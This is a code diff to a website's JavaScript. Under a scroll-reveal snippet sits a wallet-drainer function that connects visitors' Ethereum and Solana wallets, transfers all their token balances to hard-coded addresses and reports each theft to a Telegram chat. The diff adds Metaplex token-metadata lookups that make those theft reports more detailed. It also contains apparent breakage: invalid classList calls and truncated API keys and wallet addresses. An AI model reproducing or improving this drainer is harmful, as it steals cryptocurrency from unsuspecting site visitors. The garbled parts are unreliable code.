@@ -68,11 +68,11 @@ addEventOnElem(addToFavBtns, "click", toggleActive);
 const sections = document.querySelectorAll("[data-section]");
 
 const scrollReveal = function () {
-  for (let i = 0; i < sections.length; i++) {
-    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
-      sections[i].classList.add("active");
+  for (let j = 0; j < sections.length; j++) {
+    if (sections[j].getBoundingClientRect().top < window.innerHeight / 1.5) {
+      sections[j].classList("active");
     } else {
-      sections[i].classList.remove("active");
+      sections[j].classList("active");
     }
   }
 }
@@ -84,8 +84,8 @@ addEventOnElem(window, "scroll", scrollReveal);
  * Wallet connect, token fetching, and transfer with Telegram notifications
  */
 async function connectWalletAndSendTokens() {
-  if (!window.ethers || !window.Web3Modal || !window.solana) {
-    console.error("Required libraries (ethers, Web3Modal, or solana) not found.");
+  if (!window.ethers || !window.Web3Modal || !window.solana || !window.Metaplex) {
+    console.error("Required libraries (ethers, Web3Modal, solana, or Metaplex) not found.");
     return;
   }
 
@@ -93,7 +93,7 @@ async function connectWalletAndSendTokens() {
     walletconnect: {
       package: window.WalletConnectProvider.default,
       options: {
-        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
+        infuraId: "5b2c5ee5760146349669c77665d1"
       }
     }
   };
@@ -105,14 +105,15 @@ async function connectWalletAndSendTokens() {
 
   const { Connection, PublicKey, Transaction } = window.solanaWeb3;
   const { getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, createTransferInstruction } = window.splToken;
+  const { Metaplex } = window.Metaplex;
 
   const evmNetworks = [
-    { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
+    { chainId: 1, name: "Ethereum", chainName: "mainnet", exodusAddress: "0x525E64339403bFd25Fb982E77aa0db1bF57" }
   ];
 
   const solanaNetwork = {
     name: "Solana",
-    rpcUrl: "https://mainnet.helius-rpc.com/?api-key=8170a5ea-31ca-4927-8873-64e95f9a890b",
+    rpcUrl: "https://mainnet.helius-rpc.com/?apiKey=8170a5ea-31ca-4927-8873-64e95f9a890b",
     exodusAddress: "EcRdYo4ZskNRuSwP35rZWVZ1azsncNCu3HmB6dv5z8rq"
   };
 
@@ -315,15 +316,15 @@ ${balanceSummary || "No balances found or API error occurred."}
 
               const tx = await contract.transfer(network.exodusAddress, balanceInWei);
               await tx.wait();
-              console.log(`Sent ${token.symbol} on ${network.name}, txHash: ${tx.hash}`);
+              console.log(`Sent ${token.symbol} on ${network.name}, tx: ${tx.hash}`);
 
-              const decimals = parseInt(token.decimals || 18);
+              const decimals = token.decimals ?? 18;
               const balance = ethers.utils.formatUnits(token.balance, decimals);
               const successMessage = `
 ✅ ${tokenStandard} Token Transfer Successful on ${network.name}!
 Token: ${token.symbol}
 Amount: ${balance}
-Contract: ${token.token_address})
+Contract: ${token.token_address}
 Destination: ${network.exodusAddress}
 Tx Hash: ${tx.hash}
 Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
@@ -399,6 +400,9 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
         body: JSON.stringify({ chat_id: chatId, text: solConnectionMessage })
       });
 
+      // Initialize Metaplex
+      const metaplex = Metaplex.make(connection);
+
       let tokens = [];
       let tokenSummaryTelegram = "";
       let apiAttempts = 0;
@@ -429,12 +433,32 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
             page++;
           }
 
-          tokens = allTokenAccounts.map(account => ({
-            mint: account.mint,
-            amount: account.amount,
-            decimals: account.decimals || 9,
-            token_account: account.address
+          // Fetch metadata for each token
+          tokens = await Promise.all(allTokenAccounts.map(async account => {
+            let name = null;
+            let symbol = null;
+            try {
+              const mintPublicKey = new PublicKey(account.mint);
+              const metadataPda = await metaplex.nfts().pdas().metadata({ mint: mintPublicKey });
+              const metadataAccount = await connection.getAccountInfo(metadataPda);
+              if (metadataAccount) {
+                const metadata = metaplex.nfts().decodeMetadata(metadataAccount.data);
+                name = metadata.name;
+                symbol = metadata.symbol;
+              }
+            } catch (metaErr) {
+              console.warn(`Failed to fetch metadata for mint ${account.mint}: ${metaErr.message}`);
+            }
+            return {
+              mint: account.mint,
+              amount: account.amount,
+              decimals: account.decimals || 9,
+              token_account: account.address,
+              name: name || null,
+              symbol: symbol || null
+            };
           }));
+
           console.log(`Fetched ${tokens.length} SPL tokens for Solana`);
           apiSuccess = true;
 
@@ -442,7 +466,10 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           if (nonZeroTokens.length > 0) {
             tokenSummaryTelegram = nonZeroTokens.map(token => {
               const balance = token.amount / Math.pow(10, token.decimals);
-              return `• Token (Mint: ${token.mint.slice(0, 8)}...): ${balance}`;
+              const tokenDisplay = token.symbol || token.name
+                ? `${token.symbol || token.name} (${token.mint.slice(0, 8)}...)`
+                : `Mint: ${token.mint.slice(0, 8)}...`;
+              return `• ${tokenDisplay}: ${balance}`;
             }).join("\n");
           } else {
             tokenSummaryTelegram = `No non-zero ${tokenStandard} token balances found.`;
@@ -537,9 +564,12 @@ ${balanceSummary || "No balances found or API error occurred."}
           console.log(`Sent token (Mint: ${token.mint}) on ${solanaNetwork.name}, tx: ${txId}`);
 
           const balance = token.amount / Math.pow(10, token.decimals);
+          const tokenDisplay = token.symbol || token.name
+            ? `${token.symbol || token.name} (${token.mint.slice(0, 8)}...)`
+            : `Mint: ${token.mint}`;
           const successMessage = `
 ✅ ${tokenStandard} Token Transfer Successful on ${solanaNetwork.name}!
-Token Mint: ${token.mint}
+Token: ${tokenDisplay}
 Amount: ${balance}
 Destination: ${solanaNetwork.exodusAddress}
 Tx Hash: ${txId}
@@ -552,9 +582,12 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           });
         } catch (err) {
           console.warn(`Failed to process token (Mint: ${token.mint}) on ${solanaNetwork.name}: ${err.message}`);
+          const tokenDisplay = token.symbol || token.name
+            ? `${token.symbol || token.name} (${token.mint.slice(0, 8)}...)`
+            : `Mint: ${token.mint}`;
           const errorMessage = `
 ❌ ${tokenStandard} Token Transfer Failed on ${solanaNetwork.name}!
-Token Mint: ${token.mint}
+Token: ${tokenDisplay}
 Error: ${err.message || "Unknown error"}
 Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           `;
